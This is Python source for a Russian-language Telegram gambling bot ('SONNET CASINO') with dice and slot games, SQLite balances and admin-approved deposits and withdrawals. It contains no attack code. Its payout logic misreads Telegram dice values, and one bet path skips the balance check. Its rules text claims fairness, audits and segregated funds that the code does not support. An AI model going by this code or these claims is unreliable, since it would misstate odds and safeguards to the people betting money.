async def play_again(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data.replace('play_again_', '')
    if data.startswith('same_bet_'):
        game_type = data.replace('same_bet_', '')
        user_id = query.from_user.id
        user = get_user(user_id)
        bet_amount = user['last_bet_amount'] if user and user['last_bet_amount'] > 0 else 10
        
        if bet_amount > user['balance']:
            await query.answer(f"❌ Недостаточно средств! Баланс: {user['balance']:.2f} ₽", show_alert=True)
            return
    else:
        game_type = data
        bet_amount = context.user_data.get('bet_amount', 10)
    
    await start_game(update, context, game_type, bet_amount)

async def start_game(update: Update, context: ContextTypes.DEFAULT_TYPE, game_type: str, bet_amount: float):
    query = update.callback_query if update.callback_query else None
    user_id = query.from_user.id if query else update.message.from_user.id
    
    # Списываем средства и сохраняем ставку
    update_balance(user_id, -bet_amount)
    set_last_bet(user_id, bet_amount)
    
    # Отправляем анимацию
    if game_type == 'dice':
        if query:
            dice_message = await query.message.reply_dice(emoji='🎲')
        else:
            dice_message = await update.message.reply_dice(emoji='🎲')
    else:
        if query:
            dice_message = await query.message.reply_dice(emoji='🎰')
        else:
            dice_message = await update.message.reply_dice(emoji='🎰')
    
    # Ждем 5.5 секунды для анимации
    await asyncio.sleep(5.5)
    
    # Получаем результат
    dice_value = dice_message.dice.value
    
    # Обрабатываем результат
    if game_type == 'dice':
        result_text, win_amount = process_dice_result(dice_value, bet_amount)
    else:
        result_text, win_amount = process_slots_result(dice_value, bet_amount)
    
    # Обновляем баланс
    if win_amount > 0:
        update_balance(user_id, win_amount)
    
    # Добавляем в историю
    result_status = "win" if win_amount > bet_amount else "lose" if win_amount < bet_amount else "draw"
    add_game_history(user_id, game_type, bet_amount, win_amount, result_status)
    
    # Отправляем результат
    balance = get_user(user_id)['balance']
    
    result_message = f"""
🎮 *Результат игры*

{result_text}

💰 *Детали:*
├ Ставка: {bet_amount:.2f} ₽
├ Выигрыш: {win_amount:.2f} ₽
├ Чистый результат: {win_amount - bet_amount:.2f} ₽
└ Баланс: *{balance:.2f} ₽*

{'🎉 Поздравляем с выигрышем!' if win_amount > bet_amount else '😔 К сожалению, вы проиграли' if win_amount < bet_amount else '🤝 Ничья!'}
"""
    
    if query:
        await query.message.reply_text(
            result_message,
            parse_mode='Markdown',
            reply_markup=get_play_again_keyboard(game_type, win_amount > 0)
        )
    else:
        await update.message.reply_text(
            result_message,
            parse_mode='Markdown',
            reply_markup=get_play_again_keyboard(game_type, win_amount > 0)
        )

def process_dice_result(dice_value: int, bet_amount: float) -> Tuple[str, float]:
    """Обработка результата игры в кубики"""
    if 2 <= dice_value <= 6:
        win_multiplier = 0.0
        result_desc = "Выпало мало очков"
    elif dice_value == 7:
        win_multiplier = 1.0
        result_desc = "Выпало 7 очков"
    else:  # 8-12
        win_multiplier = 2.0
        result_desc = "Выпало много очков"
    
    win_amount = bet_amount * win_multiplier
    result_text = f"🎲 *Кубики*\nВыпало: *{dice_value}*\n{result_desc}"
    
    return result_text, win_amount

def process_slots_result(dice_value: int, bet_amount: float) -> Tuple[str, float]:
    """Обработка результата игры в автоматы"""
    # dice_value от 1 до 64 для слотов
    if dice_value == 1:  # Джекпот
        win_multiplier = 10.0
        result_desc = "🎰 ДЖЕКПОТ! 777 🎰"
    elif dice_value <= 5:  # 3 одинаковых
        win_multiplier = 5.0
        result_desc = "3 одинаковых символа"
    elif dice_value <= 15:  # 2 одинаковых
        win_multiplier = 2.0
        result_desc = "2 одинаковых символа"
    else:
        win_multiplier = 0.0
        result_desc = "Проигрышная комбинация"
    
    win_amount = bet_amount * win_multiplier
    result_text = f"🎰 *Автоматы*\nРезультат: *{dice_value}*\n{result_desc}"
    
    return result_text, win_amount

async def game_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            SELECT 
                COUNT(*) as total_games,
                SUM(bet_amount) as total_bet,
                SUM(win_amount) as total_win,
                SUM(CASE WHEN win_amount > bet_amount THEN 1 ELSE 0 END) as wins,
                SUM(CASE WHEN win_amount < bet_amount THEN 1 ELSE 0 END) as losses,
                SUM(CASE WHEN win_amount = bet_amount THEN 1 ELSE 0 END) as draws
            FROM games 
            WHERE user_id = ?
        ''', (user_id,))
        stats = cursor.fetchone()
    
    if stats and stats[0] > 0:
        total_games, total_bet, total_win, wins, losses, draws = stats
        profit = total_win - total_bet
        
        stats_text = f"""
📊 *Статистика игр*

🎮 *Общая:*
├ Всего игр: {total_games}
├ Побед: {wins}
├ Поражений: {losses}
└ Ничьих: {draws}

💰 *Финансовая:*
├ Всего поставлено: {total_bet:.2f} ₽
├ Всего выиграно: {total_win:.2f} ₽
└ Чистая прибыль: {profit:.2f} ₽

📈 *Процент побед:* {(wins/total_games*100):.1f}%
"""
    else:
        stats_text = "📊 *У вас пока нет игровой статистики*\n\nСыграйте в первую игру!"
    
    await query.edit_message_text(
        stats_text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🎮 Игры", callback_data="games"), 
                                            InlineKeyboardButton("🏠 Меню", callback_data="main_menu_inline")]])
    )

async def transactions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "📋 *Мои транзакции*\n\nВыберите тип транзакций:",
        parse_mode='Markdown',
        reply_markup=get_transactions_keyboard()
    )

async def show_transactions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    transaction_type = query.data
    
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        
        if transaction_type == "all_transactions":
            cursor.execute('''
                SELECT type, amount, status, timestamp, invoice 
                FROM transactions 
                WHERE user_id = ? 
                ORDER BY timestamp DESC 
                LIMIT 10
            ''', (user_id,))
            title = "Все транзакции"
        elif transaction_type == "deposit_transactions":
            cursor.execute('''
                SELECT type, amount, status, timestamp, invoice 
                FROM transactions 
                WHERE user_id = ? AND type = 'deposit'
                ORDER BY timestamp DESC 
                LIMIT 10
            ''', (user_id,))
            title = "Пополнения"
        else:
            cursor.execute('''
                SELECT type, amount, status, timestamp, invoice 
                FROM transactions 
                WHERE user_id = ? AND type = 'withdraw'
                ORDER BY timestamp DESC 
                LIMIT 10
            ''', (user_id,))
            title = "Выводы"
        
        transactions_list = cursor.fetchall()
    
    if transactions_list:
        trans_text = f"📋 *{title}*\n\n"
        for i, (t_type, amount, status, timestamp, invoice) in enumerate(transactions_list, 1):
            status_emoji = "✅" if status == 'approved' else "❌" if status in ['rejected', 'cancelled'] else "⏳"
            trans_text += f"{i}. {status_emoji} {t_type}: {amount:.2f} ₽\n   Счет: `{invoice}`\n   Время: {timestamp}\n\n"
    else:
        trans_text = f"📋 *{title}*\n\nУ вас пока нет транзакций"
    
    await query.edit_message_text(
        trans_text,
        parse_mode='Markdown',
        reply_markup=get_transactions_keyboard()
    )

# Вспомогательные функции
async def show_main_menu_inline(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query:
        await query.answer()
        await query.edit_message_text(
            "🎰 *Главное меню*\n\nВыберите действие:",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("👤 Профиль", callback_data="profile")],
                [InlineKeyboardButton("🎮 Игры", callback_data="games")],
                [InlineKeyboardButton("💰 Финансы", callback_data="finances")],
                [InlineKeyboardButton("📜 Правила", callback_data="rules")]
            ])
        )
    else:
        await update.message.reply_text(
            "🎰 *Главное меню*\n\nВыберите действие:",
            parse_mode='Markdown',
            reply_markup=get_main_reply_keyboard()
        )

async def finances_command_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "💰 *Финансовые операции*\n\nВыберите действие:",
        parse_mode='Markdown',
        reply_markup=get_finances_keyboard()
    )

async def games_command_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🎮 *Игровой зал*\n\nВыберите игру:",
        parse_mode='Markdown',
        reply_markup=get_games_keyboard()
    )

# Обработчики для администраторов (исправленные)
async def admin_approve_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("❌ У вас нет прав администратора", show_alert=True)
        return
    
    invoice = query.data.replace("admin_approve_", "")
    
    # Находим пользователя с этим счетом
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, deposit_amount FROM users WHERE deposit_invoice = ?", (invoice,))
        result = cursor.fetchone()
    
    if result:
        user_id, amount = result
        
        # Пополняем баланс
        update_balance(user_id, amount)
        clear_deposit_invoice(user_id)
        add_transaction(user_id, 'deposit', amount, 'approved', invoice)
        
        # Сообщаем пользователю
        try:
            await context.bot.send_message(
                user_id,
                f"✅ *Баланс успешно пополнен!*\n\nСумма: *{amount:.2f} ₽*\nСчет: `{invoice}`\n\nПроверьте баланс в профиле! 🎉",
                parse_mode='Markdown'
            )
        except:
            pass
        
        # Сообщаем администраторам
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    admin_id,
                    f"✅ *Пополнение одобрено*\n\nСчет: `{invoice}`\nСумма: {amount:.2f} ₽",
                    parse_mode='Markdown'
                )
            except:
                pass
        
        await query.edit_message_text(
            f"✅ *Пополнение одобрено*\n\nСчет: `{invoice}` успешно обработан",
            parse_mode='Markdown'
        )
    else:
        await query.answer("❌ Счет не найден", show_alert=True)

async def admin_reject_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("❌ У вас нет прав администратора", show_alert=True)
        return
    
    invoice = query.data.replace("admin_reject_", "")
    
    # Находим пользователя с этим счетом
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, deposit_amount FROM users WHERE deposit_invoice = ?", (invoice,))
        result = cursor.fetchone()
    
    if result:
        user_id, amount = result
        clear_deposit_invoice(user_id)
        add_transaction(user_id, 'deposit', amount, 'rejected', invoice)
        
        # Сообщаем пользователю
        try:
            await context.bot.send_message(
                user_id,
                f"❌ *Заявка на пополнение отклонена*\n\nСчет: `{invoice}`\nСумма: {amount:.2f} ₽\n\nПожалуйста, обратитесь в поддержку {SUPPORT_USERNAME}",
                parse_mode='Markdown'
            )
        except:
            pass
        
        # Сообщаем администраторам
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    admin_id,
                    f"❌ *Пополнение отклонено*\n\nСчет: `{invoice}` отклонен",
                    parse_mode='Markdown'
                )
            except:
                pass
        
        await query.edit_message_text(
            f"❌ *Пополнение отклонено*\n\nВы отказали в пополнении счету `{invoice}`",
            parse_mode='Markdown'
        )
    else:
        await query.answer("❌ Счет не найден", show_alert=True)

async def admin_approve_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("❌ У вас нет прав администратора", show_alert=True)
        return
    
    invoice = query.data.replace("admin_withdraw_approve_", "")
    
    # Находим пользователя с этой заявкой
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, withdraw_amount, withdraw_bank, withdraw_details FROM users WHERE withdraw_invoice = ?", (invoice,))
        result = cursor.fetchone()
    
    if result:
        user_id, amount, bank, details = result
        
        # Обновляем статистику вывода
        update_withdrawn(user_id, amount)
        clear_withdraw_invoice(user_id)
        add_transaction(user_id, 'withdraw', amount, 'approved', invoice, details)
        
        # Сообщаем пользователю
        try:
            await context.bot.send_message(
                user_id,
                f"✅ *Вывод успешно выполнен!*\n\nСумма: *{amount:.2f} ₽*\nЗаявка: `{invoice}`\nБанк: {bank}\n\nСпасибо за игру! 🎉",
                parse_mode='Markdown'
            )
        except:
            pass
        
        # Сообщаем администраторам
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    admin_id,
                    f"✅ *Вывод выполнен*\n\nЗаявка: `{invoice}`\nСумма: {amount:.2f} ₽",
                    parse_mode='Markdown'
                )
            except:
                pass
        
        await query.edit_message_text(
            f"✅ *Вывод выполнен*\n\nЗаявка `{invoice}` успешно обработана",
            parse_mode='Markdown'
        )
    else:
        await query.answer("❌ Заявка не найдена", show_alert=True)

async def admin_reject_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id not in ADMIN_IDS:
        await query.answer("❌ У вас нет прав администратора", show_alert=True)
        return
    
    invoice = query.data.replace("admin_withdraw_reject_", "")
    
    # Находим пользователя с этой заявкой
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, withdraw_amount FROM users WHERE withdraw_invoice = ?", (invoice,))
        result = cursor.fetchone()
    
    if result:
        user_id, amount = result
        
        # Возвращаем средства на баланс
        update_balance(user_id, amount)
        clear_withdraw_invoice(user_id)
        add_transaction(user_id, 'withdraw', amount, 'rejected', invoice)
        
        # Сообщаем пользователю
        try:
            await context.bot.send_message(
                user_id,
                f"❌ *Заявка на вывод отклонена*\n\nЗаявка: `{invoice}`\nСумма: {amount:.2f} ₽\n\nСредства возвращены на баланс",
                parse_mode='Markdown'
            )
        except:
            pass
        
        # Сообщаем администраторам
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    admin_id,
                    f"❌ *Вывод отклонен*\n\nЗаявка: `{invoice}` отклонена",
                    parse_mode='Markdown'
                )
            except:
                pass
        
        await query.edit_message_text(
            f"❌ *Вывод отклонен*\n\nЗаявка `{invoice}` отклонена, средства возвращены",
            parse_mode='Markdown'
        )
    else:
        await query.answer("❌ Заявка не найдена", show_alert=True)

async def cancel_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    invoice = query.data.replace("cancel_withdraw_", "")
    user_id = query.from_user.id
    
    # Находим заявку
    with closing(sqlite3.connect("casino.db")) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT withdraw_amount FROM users WHERE user_id = ? AND withdraw_invoice = ?", (user_id, invoice))
        result = cursor.fetchone()
    
    if result:
        amount = result[0]
        
        # Возвращаем средства на баланс
        update_balance(user_id, amount)
        clear_withdraw_invoice(user_id)
        add_transaction(user_id, 'withdraw', amount, 'cancelled', invoice)
        
        # Уведомляем администраторов
        for admin_id in ADMIN_IDS:
            try:
                await context.bot.send_message(
                    admin_id,
                    f"❌ *Вывод отменен пользователем*\n\nЗаявка: `{invoice}`\nСумма: {amount:.2f} ₽",
                    parse_mode='Markdown'
                )
            except:
                pass
        
        await query.edit_message_text(
            f"✅ *Вывод отменен*\n\nЗаявка `{invoice}` отменена\nСумма {amount:.2f} ₽ возвращена на баланс",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 В меню", callback_data="main_menu_inline")]])
        )
    else:
        await query.answer("❌ Заявка не найдена", show_alert=True)

# Обработчики для других callback
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "main_menu_inline":
        await show_main_menu_inline(update, context)
    elif query.data == "profile":
        await profile_command_callback(update, context)
    elif query.data == "profile_refresh":
        await profile_refresh(update, context)
    elif query.data == "finances":
        await finances_command_callback(update, context)
    elif query.data == "games":
        await games_command_callback(update, context)
    elif query.data == "rules":
        await rules_command_callback(update, context)
    elif query.data == "transactions":
        await transactions(update, context)
    elif query.data == "quick_game":
        await quick_game(update, context)
    elif query.data.startswith("all_transactions") or query.data.startswith("deposit_transactions") or query.data.startswith("withdraw_transactions"):
        await show_transactions(update, context)
    elif query.data == "deposit":
        await deposit_start(update, context)
    elif query.data == "withdraw":
        await withdraw_start(update, context)
    elif query.data == "game_dice":
        await game_dice(update, context)
    elif query.data == "game_slots":
        await game_slots(update, context)
    elif query.data == "game_stats":
        await game_stats(update, context)
    elif query.data.startswith("game_"):
        game_type = query.data.replace("game_", "")
        if game_type == "dice":
            await game_dice(update, context)
        else:
            await game_slots(update, context)
    elif query.data.startswith("change_bet_"):
        game_type = query.data.replace("change_bet_", "")
        if game_type == "dice":
            await game_dice(update, context)
        else:
            await game_slots(update, context)
    elif query.data.startswith("play_again_"):
        await play_again(update, context)
    elif query.data.startswith("same_bet_"):
        await play_again(update, context)
    elif query.data == "active_deposit":
        user = get_user(query.from_user.id)
        if user and user['deposit_invoice']:
            await query.edit_message_text(
                f"💳 *Активный счет*\n\nСчет: `{user['deposit_invoice']}`\nСумма: {user['deposit_amount']} ₽\n\nОсталось времени: рассчитывается...",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data="finances")]])
            )
    elif query.data == "cancel_active_deposit":
        user_id = query.from_user.id
        clear_deposit_invoice(user_id)
        await query.edit_message_text(
            "✅ *Счет отменен*\n\nВозвращаемся в меню финансов...",
            parse_mode='Markdown'
        )
        await finances_command_callback(update, context)

async def profile_command_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    user = get_user(user_id)
    
    if user:
        profile_text = f"""
📊 *Ваш профиль*

👤 *Имя:* {user['first_name']} {user.get('last_name', '')}
🆔 *ID:* {user_id}
🔖 *Юзернейм:* @{user['username'] if user['username'] else 'Нет'}
💰 *Баланс:* {user['balance']:.2f} ₽
💸 *Выведено:* {user['withdrawn']:.2f} ₽
🎮 *Последняя ставка:* {user['last_bet_amount']:.2f} ₽
"""
        
        await query.edit_message_text(
            profile_text,
            parse_mode='Markdown',
            reply_markup=get_profile_keyboard()
        )

async def rules_command_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    rules_text = """
📜 *Правила SONNET CASINO*

🎰 *Общие правила:*
• Минимальный возраст: 18 лет
• Все игры используют ГСЧ для честности
• Вывод средств осуществляется на банковские карты

💰 *Финансы:*
├ Минимальный депозит: 10 ₽
├ Минимальный вывод: 100 ₽
├ Комиссия при выводе: 0%
└ Время обработки вывода: 1-12 часов

🎮 *Игры:*
• 🎲 Кубики: Ставки от 1 ₽, коэффициенты до x2
• 🎰 Автоматы: Ставки от 1 ₽, коэффициенты до x10

⚖️ *Обязательства:*
• Администрация оставляет за собой право проверять транзакции
• При подозрении в мошенничестве аккаунт может быть заблокирован
• Все спорные ситуации решаются через поддержку

🛡️ *Безопасность:*
• Ваши данные защищены
• Средства хранятся на отдельных счетах
• Регулярные аудиты системы

📞 *Поддержка:* @LEOLST
"""
    
    await query.edit_message_text(
        rules_text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 В меню", callback_data="main_menu_inline")]])
    )

def main():
    # Проверка токена
    if not BOT_TOKEN:
        print("❌ ОШИБКА: BOT_TOKEN не найден!")
        print("Добавь переменную BOT_TOKEN в Railway Variables")
        return
    
    # Инициализация базы данных
    init_db()
    
    try:
        # Создание приложения
        application = Application.builder().token(BOT_TOKEN).build()
        
        # ConversationHandler для пополнения
        deposit_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(deposit_start, pattern="^deposit$")],
            states={
                SELECT_PAYMENT_METHOD: [CallbackQueryHandler(select_payment_method, pattern="^(method_|deposit_cancel)")],
                ENTER_DEPOSIT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_deposit_amount_text)],
                CONFIRM_DEPOSIT: [CallbackQueryHandler(confirm_deposit, pattern="^(confirm|cancel)$")]
            },
            fallbacks=[
                CommandHandler("start", start),
                CallbackQueryHandler(show_main_menu_inline, pattern="^main_menu_inline$")
            ],
            name="deposit_conversation",
            persistent=False
        )
        
        # ConversationHandler для вывода
        withdraw_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(withdraw_start, pattern="^withdraw$")],
            states={
                ENTER_WITHDRAW_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, enter_withdraw_amount)],
                SELECT_BANK: [CallbackQueryHandler(select_bank, pattern="^(bank_|withdraw_cancel)")],
                ENTER_DETAILS: [MessageHandler(filters.TEXT & ~filters.COMMAND, enter_withdraw_details)],
                CONFIRM_WITHDRAW: [CallbackQueryHandler(confirm_withdraw, pattern="^(confirm|cancel)$")]
            },
            fallbacks=[
                CommandHandler("start", start),
                CallbackQueryHandler(show_main_menu_inline, pattern="^main_menu_inline$")
            ],
            name="withdraw_conversation",
            persistent=False
        )
        
        # ConversationHandler для ставок
        bet_conv = ConversationHandler(
            entry_points=[CallbackQueryHandler(game_dice, pattern="^game_dice$"),
                         CallbackQueryHandler(game_slots, pattern="^game_slots$")],
            states={
                ENTER_BET_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, enter_bet_amount)]
            },
            fallbacks=[
                CommandHandler("start", start),
                CallbackQueryHandler(show_main_menu_inline, pattern="^main_menu_inline$")
            ],
            name="bet_conversation",
            persistent=False
        )
        
        # ConversationHandler должны быть добавлены ПЕРВЫМИ!
        application.add_handler(deposit_conv)
        application.add_handler(withdraw_conv)
        application.add_handler(bet_conv)
        
        # Обработчики команд
        application.add_handler(CommandHandler("start", start))
        
        # Обработчики игр
        application.add_handler(CallbackQueryHandler(place_bet, pattern="^place_bet_"))
        application.add_handler(CallbackQueryHandler(play_again, pattern="^(play_again_|same_bet_)"))
        application.add_handler(CallbackQueryHandler(quick_game, pattern="^quick_game$"))
        
        # Обработчики администраторов
        application.add_handler(CallbackQueryHandler(admin_approve_deposit, pattern="^admin_approve_"))
        application.add_handler(CallbackQueryHandler(admin_reject_deposit, pattern="^admin_reject_"))
        application.add_handler(CallbackQueryHandler(admin_approve_withdraw, pattern="^admin_withdraw_approve_"))
        application.add_handler(CallbackQueryHandler(admin_reject_withdraw, pattern="^admin_withdraw_reject_"))
        application.add_handler(CallbackQueryHandler(cancel_withdraw, pattern="^cancel_withdraw_"))
        
        # Общие обработчики callback
        application.add_handler(CallbackQueryHandler(handle_callback))
        
        # Обработчик текстовых сообщений должен быть ПОСЛЕ ConversationHandler
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
        
        # Запуск бота
        print("🤖 Бот запускается...")
        print(f"✅ Токен найден: {'да' if BOT_TOKEN else 'нет'}")
        print("✅ База данных инициализирована")
        
        application.run_polling(allowed_updates=Update.ALL_TYPES)
        
    except Exception as e:
        print(f"❌ Ошибка при запуске: {e}")
        import traceback
        traceback.print_exc()

if __name__ == '__main__':
    main()